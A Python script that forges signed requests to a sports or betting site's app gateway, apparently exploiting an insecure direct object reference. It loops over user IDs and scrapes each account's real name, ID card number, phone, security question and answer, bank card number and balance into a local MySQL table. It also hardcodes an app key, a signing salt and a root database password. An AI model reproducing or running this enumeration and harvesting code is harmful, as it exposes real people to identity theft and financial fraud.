#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests,time,re
import hashlib,pymysql,json



def now_date(format_string="%Y-%m-%d %H:%M:%S"):
    time_stamp = int(time.time())
    time_array = time.localtime(time_stamp)
    str_date = time.strftime(format_string, time_array)
    return str_date


class renren():
    def now_date(self,format_string="%Y-%m-%d %H:%M:%S"):
        time_stamp = int(time.time())
        time_array = time.localtime(time_stamp)
        str_date = time.strftime(format_string, time_array)
        return str_date
    def now_to_date(self):
        serverTime = str(self.now_date())

        serverTime = re.findall("\d+", serverTime)

        time_time = ''
        for i in serverTime:
            time_time = time_time + i
        return time_time
    def md5_key(self,str):
        # 待加密信息

        # 创建md5对象
        hl = hashlib.md5()
        # 更新hash对象的值，如果不使用update方法也可以直接md5构造函数内填写
        # md5_obj=hashlib.md5("123456".encode("utf-8")) 效果一样
        hl.update(str.encode("utf-8"))
        #print('MD5加密前为 ：' + str)
        #print('MD5加密后为 ：' + hl.hexdigest())
        return hl.hexdigest()
    def re_data(self,id):
        url="http://api.pcsport.com.cn:8089/ajax/AppGateway.ashx"
        headers={'Content-Type': 'application/x-www-form-urlencoded','Host': 'api.pcsport.com.cn:8089','Connection': 'close','User-Agent': 'Mozilla/5.0(Linux;U;Android 2.2.1;en-us;Nexus One Build.FRG83) AppleWebKit/553.1(KHTML,like Gecko) Version/4.0 Mobile Safari/533.1','Expect': '100-continue'}
        time_data='20190422182820'
        #(time_data)
        str1='opt=41&auth=%7B%22loginType%22%3A%221%22%2C%22imei%22%3A%22865166029734707%22%2C%22os%22%3A%22Android%22%2C%22os_version%22%3A%225.0%22%2C%22app_version%22%3A%221.3.2%22%2C%22source_id%22%3A%22Yek_test%22%2C%22ver%22%3A%220.9%22%2C%22UID%22%3A%22'
        str2='%22%2C%22app_key%22%3A%22phRXtyop97Ssfd5g5erD98Uwe55Kv9TT%22%2C%22crc%22%3A%22'
        str3='%22%2C%22time_stamp%22%3A%22'
        str4='%22%7D&info=%7B%7D'
        md5_str=str(time_data)+'865166029734707'+str(id)+'97be06fccc7731b287ff46682ca9843e{}'
        #data="34636 5a459558839babb54111daed01f2cdf4 20190422043547"
        data=str1+str(id)+str2+str(self.md5_key(str(md5_str)))+str3+str(time_data)+str4
        #print(data)
        value=requests.post(url=url,headers=headers,data=data)
        value=value.text

        return value


if __name__ == '__main__':
    data=renren()
    #data.re_data(34690)
    conn = pymysql.connect(host='localhost', port=3306, user='root', passwd='Leng9s9bxs', db='test', charset='utf8')
    cu = conn.cursor()
    for i in range(34725,34800):
        id_id=i
        re=data.re_data(id_id)
        s=json.loads(re)
        #print(s)
        print(id_id)
        if s['error']=='0':

            print(s['name'], s['mobile'], s['qqnumber'], s['realityName'], s['idCardnumber'], s['securityquestion'],
                s['securityQuestionId'], s['securityQuestionAnswer'], s['bankUserName'], s['bankCardNumber'],
                s['provinceName'], s['cityName'], s['bankTypeName'], s['branchBankName'], s['userAllowHandsel'],
                s['cashWithdrawal'], s['balance'])
            cu.execute(
                "replace into renren_xiaofeng(id,name_name,mobile,qqnumber,realityName,idCardnumber,securityquestion,securityQuestionId,securityQuestionAnswer,bankUserName,bankCardNumber,provinceName,cityName,bankTypeName,branchBankName,userAllowHandsel,cashWithdrawal,balance) values('{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}')".format(
                    id_id,s['name'], s['mobile'], s['qqnumber'], s['realityName'], s['idCardnumber'], s['securityquestion'],
                    s['securityQuestionId'], s['securityQuestionAnswer'], s['bankUserName'], s['bankCardNumber'],
                    s['provinceName'], s['cityName'], s['bankTypeName'], s['branchBankName'], s['userAllowHandsel'],
                    s['cashWithdrawal'], s['balance']))

            conn.commit()
        #time.sleep(1)
    conn.close()
